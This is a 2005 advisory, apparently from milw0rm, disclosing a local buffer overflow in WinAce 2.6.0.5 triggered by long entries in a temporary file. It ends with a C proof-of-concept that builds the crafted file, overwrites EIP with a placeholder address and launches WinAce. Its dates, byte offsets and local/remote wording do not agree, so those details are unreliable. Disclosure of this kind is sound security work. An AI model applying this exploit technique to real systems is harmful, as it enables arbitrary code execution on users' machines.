/*
===========================================================================
Application: 	WinAce
		http://www.winace.com/
Versions:	2.6.0.5
Platforms:	Windows
Bug:		buffer-overflow
Exploitation:	local
Date:		Jul 22 2004
Author:		ATmaCA
		e-mail: atmaca@icqmail.com
		web:    http://www.atmacasoft.com
Credit:		Kozan  		
===========================================================================

I. BACKGROUND

WinAce is an archiving utility with an easy-to-use interface for creating,
extracting, and viewing archives. It includes built-in compression for
ACE, ZIP, LHA, and MS CAB formats, and built-in decompression for
ACE, ZIP, LHA, MS CAB, RAR, ARJ, ARC, GZIP, TAR, and ZOO formats.
You can create multivolume (disk-spanning) archives for ACE and MS CAB formats
and self-extracting archives (SFX) for ACE and ZIP formats.  

More information about WinAce is available from:
http://www.winace.com/winace.html

II. DESCRIPTION

Local exploitation of a buffer overflow vulnerability in WinAce
allows attackers to execute arbitrary code.

When WinAce attempts to compress any file, firstly it creates temporary file which contains 
the location of the file which will be compressed.
The problem specifically exists when parsing temporary files that contain long file entries.

An example malicious .tmp file with a long file name:

	c:\AAAAAAAAA...[A x 2021 bytes is where the EIP starts]1234[AAAA...AAAAA]\r\n

Command line:

	"C:\Program Files\WinAce\winace.exe" a "C:\Program Files\WinAce\winace" @c:\crafted.tmp

'[A x 2021]' represents any string of 2021 bytes in
length. Opening either malicious tmp file on the Microsoft Windows
platform will cause WinAce to crash with an access violation when
attempting to execute instruction 0x34333231, which is the little-endian
ASCII code representation of '1234'. An attacker can exploit this
vulnerability to redirect the flow of control and eventually execute
arbitrary code. This example is specific to the Microsoft Windows
platform.

III. ANALYSIS

Exploitation of the described vulnerability allows remote attackers to
execute arbitrary code under the context of the user who started WinAce.

Exploitation requires that an attacker to execute arbitrary command line which contain location of malicious tmp file.

IV. DETECTION

WinAce 2.6.0.5 as installed on the Microsoft Windows
platform is affected. Earlier versions may also be susceptible.

V. DISCLOSURE TIMELINE

07/22/2005  Initial vendor notification
07/25/2005  Initial vendor response
08/19/2005  Public disclosure

VI. POC:
*/

/*
*
* WinAce Temporary File Parsing Buffer Overflow Vulnerability
* http://www.winace.com/winace.html
* Discovered & Coded By ATmaCA
* Web: atmacasoft.com && spyinstructors.com
* E-Mail: atmaca@icqmail.com
* Credit to kozan
*
*/

/*
*
* Tested with WinAce 2.6.0.5 as installed on the Win XP Sp2 En platform
*
*/

#include <windows.h>
#include <stdio.h>

void main()
{
        // create crafted command line
        char tmpfile[] = "c:\\crafted.tmp";
        char winacepath[] = "\"C:\\Program Files\\WinAce\\winace.exe\"";
        char compresspar[] = " a \"C:\\Program Files\\WinAce\\winace\" @";
        char runpar[300];
        int i = 0;
        char Ret_Addr[]= "\x31\x32\x33\x34";

        strcpy(runpar,winacepath);
        strcat(runpar,compresspar);
        strcat(runpar,tmpfile);

        // create crafted .tmp file
        FILE *di;
        if( (di=fopen(tmpfile,"wb")) == NULL ){
                return;
        }

        fprintf(di,"c:\\");

        for(i=0;i<2013;i++)
                fputc(0x41,di);

        // Overwriting the return address (EIP)
        fprintf(di,Ret_Addr); //EIP

        for(i=0;i<178;i++)
                fputc(0x41,di);

        // end of file
        fprintf(di,"\x2E\x74\x78\x74\x0D\x0A");

        fclose(di);
        WinExec(runpar,SW_SHOW);
}

// milw0rm.com [2005-08-19]
